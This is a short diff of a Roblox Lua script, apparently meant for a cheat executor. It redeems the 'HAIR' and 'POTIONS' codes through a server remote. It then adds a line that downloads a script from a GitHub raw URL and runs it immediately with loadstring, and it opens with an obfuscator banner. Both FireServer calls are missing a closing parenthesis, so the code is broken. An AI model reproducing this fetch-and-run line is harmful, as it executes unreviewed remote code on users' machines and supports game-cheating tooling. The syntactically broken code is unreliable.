@@ -1,6 +1,17 @@
-for _, v in pairs({"POTIONS", "HAIR"}) do
-    game:GetService("ReplicatedStorage").Remotes.UseCode:FireServer(v); print(v)
-end
+local args = {
+    [1] = "HAIR"
+}
+
+game:GetService("ReplicatedStorage").Remotes.UseCode:FireServer(unpack(args)
+wait(0.1)
+local args = {
+    [1] = "POTIONS"
+}
+
+game:GetService("ReplicatedStorage").Remotes.UseCode:FireServer(unpack(args)
+wait(0.1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KazeOnTop/Rice-Anti-Afk/main/Wind", true))()
+wait(0.1)
 --[[
  .____                  ________ ___.    _____                           __                
  |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
